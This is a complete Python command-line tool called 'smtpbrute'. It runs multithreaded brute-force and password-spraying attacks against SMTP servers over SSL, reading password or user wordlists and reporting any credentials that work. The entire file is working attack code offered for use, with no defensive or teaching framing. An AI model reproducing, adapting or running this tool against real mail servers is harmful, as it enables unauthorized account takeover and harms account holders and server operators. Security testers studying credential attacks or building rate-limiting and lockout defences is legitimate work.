#!/usr/bin/env python3
import smtplib
import sys
import threading
import time
from colorama import Fore, Style, Back
from pyfiglet import Figlet

def menu():
    print(Fore.LIGHTRED_EX + "Usage: smtp-brute \n userbrute \n passwordspray" + Fore.RESET)
    exit(1)

def main():
    try:
        tl = list()
        banner = Figlet(font='standard')
        print(Style.BRIGHT + Fore.RED + banner.renderText("smtpbrute")+ Style.NORMAL + Fore.RESET)
        dict = open(sys.argv[2], "r", errors="ignore")
        pwds = dict.readlines()
        print(Fore.LIGHTGREEN_EX + "[+] Attack started" + Fore.RESET)
        for pwd in pwds:
            x = threading.Thread(target=try_login, args=(sys.argv[3], str(pwd).replace("\n", "")))
            x.start()
            tl.append(x)
            print_charge(len(tl), len(pwds), Fore.BLUE + "[+] Attack launched" + Fore.RESET)
            time.sleep(0.05)
        for t in tl:
            t.join()
        print(Fore.LIGHTGREEN_EX + "[+] Attack finished" + Fore.RESET)
        dict.close()
    except Exception as e:
        print(Fore.LIGHTRED_EX + "Usage: smtp-brute userbrute passwordlist.txt user RHOST RPORT")
        print(Fore.LIGHTRED_EX + f"Error: {e}" + Fore.RESET)

def try_login(usr, pwd):
    try:
        print(Fore.YELLOW + f"[*] Trying password: {pwd} for user: {usr}" + Fore.RESET)
        server = smtplib.SMTP_SSL(sys.argv[4], int(sys.argv[5]))
        server.login(usr, pwd)
        print("\b"*80 + " "*80 + "\b"*81, end='', flush=True)
        print(Fore.BLUE + "[+] Password matched: " + Fore.RED + pwd + Fore.RESET)
        server.quit()
    except Exception as e:
        print(Fore.RED + f"[-] Failed with password: {pwd} for user: {usr} - {e}" + Fore.RESET)

def print_charge(prog, total, fmsg):
    print("\b"*80 + " "*80 + "\b"*81, end='', flush=True)
    if prog == total:
        print(fmsg)
    else:
        print(Fore.LIGHTRED_EX, f"\b[{prog}/{total}] {Fore.BLUE} Launching attack...{Fore.RESET}", end='', flush=True)

def userbrute():
    try:
        config = list()
        banner = Figlet(font='standard')
        print(Style.BRIGHT + Fore.RED + banner.renderText("smtpbrute") + Style.NORMAL + Fore.RESET)
        dict = open(sys.argv[2], "r", errors="ignore")
        users = dict.readlines()
        print(Fore.LIGHTGREEN_EX + "[+] Attack started" + Fore.RESET)
        for user in users:
            x = threading.Thread(target=try_user_brute, args=(user, str(sys.argv[3])))
            x.start()
            config.append(x)
            print_charge(len(config), len(users), Fore.BLUE + "[+] Attack launched" + Fore.RESET)
            time.sleep(0.05)
    except Exception as e:
        print(Fore.LIGHTRED_EX + "Usage: smtp-brute passwordspray userfile.txt password RHOST RPORT")
        print(Fore.LIGHTRED_EX + f"Error: {e}" + Fore.RESET)

def try_user_brute(user, pwd):
    try:
        print(Fore.YELLOW + f"[*] Trying user: {user.strip()} with password: {pwd}" + Fore.RESET)
        server = smtplib.SMTP_SSL(sys.argv[4], int(sys.argv[5]))
        server.login(user.strip(), pwd)
        print("\b"*80 + " "*80 + "\b"*81, end='', flush=True)
        print(Fore.BLUE + "[+] Password Found: " + Fore.RED + pwd + Fore.RESET)
        server.quit()
    except Exception as e:
        print(Fore.RED + f"[-] Failed with user: {user.strip()} and password: {pwd} - {e}" + Fore.RESET)

def __init__():
    try:
        if sys.argv[1] == "userbrute":
            main()
        elif sys.argv[1] == "passwordspray":
            userbrute()
        elif len(sys.argv) < 2:
            menu()
        elif sys.argv[1] == "--help" or sys.argv[1] == "-h":
            print(Fore.LIGHTRED_EX + "Run smtp-brute To Get The Help Menu")
    except:
        menu()

__init__()

